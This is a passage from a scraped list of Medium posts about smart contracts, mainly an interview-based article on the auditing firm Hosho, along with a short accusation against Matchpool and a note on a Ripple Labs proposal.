Furrier (@furrier) and Dave Vellante (@dvellante), co-hosts of theCUBE, SiliconANGLE Media\u2019s mobile livestreaming studio, at the Polycon18 event in the Bahamas. They discussed the vulnerabilities in current blockchain processes and how Hosho is reducing ICO risk.As much attention as blockchain has gotten from companies and individuals alike, serious security considerations are still rare among even those who face tangible risks. \u201cWe have the best hedge funds cutting checks into companies before the smart contract is even written, let alone audited,\u201d Sawhney said.What Sawhney hopes to do with Hosho is partner with these hedge funds and affirm their commitment to security early on, both internally and within the smart contract. Hosho secures these agreements by doing a line-by-line code review of each smart contract that\u2019s written, conducting a gas analysis and a static analysis, and making sure that the smart contract follows the guidelines of its white paper.\u201cWe can mitigate the risks for exchanges and for investors,\u201d he said. \u201cThere\u2019s no chance that this is going to be hacked, money won\u2019t be stolen, money won\u2019t be lost, and there\u2019s no chance of a security vulnerability.Posted on 7wData.be.", "responses": ""}, {"title": "", "author_name": "BambouClub", "link": "https://medium.com/@BambouClub/why-did-you-slyly-edit-this-and-remove-the-reference-to-smart-contract-japan-a-ponzi-scheme-a24266a4cd98?source=search_post", "post_date": "Apr 7, 2017", "readtime": "", "upvotes": "1", "content": "BambouClubBlockedUnblockFollowFollowingApr 7, 2017Why did you slyly edit this and remove the reference to Smart Contract Japan, a ponzi scheme?Matchpool Optimisation StrategyThis article details our decisions to protect the current Ether raised in the Matchpool Crowdfunding Campaign.medium.comBad luck for you I screen-grabbed it before the edit you did in the last 6\u201312 hours.https://twitter.com/BambouClub/status/850227007212224512", "responses": ""}, {"title": "Ripple Labs Unveils Proposal for New Smart Contract\u00a0System", "author_name": "Faisal Khan", "link": "https://blog.faisalkhan.com/ripple-labs-unveils-proposal-for-new-smart-contract-system-9d6d656b3936?source=search_post", "post_date": "Aug 20, 2014", "readtime": "", "upvotes": "", "content": "Ripple Labs Unveils Proposal for New Smart Contract\u00a0SystemFaisal KhanBlockedUnblockFollowFollowingAug 20, 2014The company\u2019s proposed system could reinvigorate the movement to build smart contract mechanisms.Source: www.coindesk.comRipple Labs continues to makes waves. No doubt there will be clones, but Ripple\u2019s core idea of value being retained in its native form within the Ripple system is what makes it so unique. No more forced conversions.See on Scoop.it\u200a\u2014\u200aMoney & Payments", "responses": ""}, {"title": "", "author_name": "Yves Mulkers", "link": "https://medium.com/@YvesMulkers/solving-blockchains-security-problem-one-smart-contract-at-a-time-91823237757f?source=search_post", "post_date": "Mar 17, 2018", "readtime": "2 min read", "upvotes": "", "content": "Yves MulkersBlockedUnblockFollowFollowingMar 17, 2018Solving blockchain\u2019s security problem one smart contract at a\u00a0timeSecurity has held significant weight in arguments against enterprise blockchain initiatives. Endpoint vulnerabilities, risks of malware to keys, alack of regulation and more have created hesitation in a space ripe for innovation\u200a\u2014\u200awith the right security protocols.\u201cThere was nobody in this space that we saw laser focused on just blockchain security,\u201d said Hartej Sawhney (pictured), senior advisor at Pink Sky Capital and cofounder of blockchain security company Hosho.io. \u201cSo we began focusing on auditing smart contracts\u00a0\u2026 and then putting a seal of approval on that\u201d to mitigate risk.After seeing the low quality of smart contracts surrounding initial coin offerings at crypto hedge funds, Sawhney and his partner Yo Sub Kwon set out to create Hosho as an efficient, reliable auditing tool. Sawhney spoke with John Furrier (@furrier) and Dave Vellante (@dvellante), co-hosts of theCUBE, SiliconANGLE Media\u2019s mobile livestreaming studio, at the Polycon18 event in the Bahamas. They discussed the vulnerabilities in current blockchain processes and how Hosho is reducing ICO risk.As much attention as blockchain has gotten from companies and individuals alike, serious security considerations are still rare among even those who face tangible risks. \u201cWe have the best hedge funds cutting checks into companies before the smart contract is even written, let alone audited,\u201d Sawhney said.What Sawhney hopes to do with Hosho is partner with these hedge funds and affirm their commitment to security early on, both internally and within the smart contract. Hosho secures these agreements by doing a line-by-line code review of each smart contract that\u2019s written, conducting a gas analysis and a static analysis, and making sure that the smart contract follows the guidelines of its white paper.\u201cWe can mitigate the risks for exchanges and for investors,\u201d he said. \u201cThere\u2019s no chance that this is going to be hacked, money won\u2019t be stolen, money won\u2019t be lost, and there\u2019s no chance of a security vulnerability.Posted on 7wData.be.", "responses": ""}]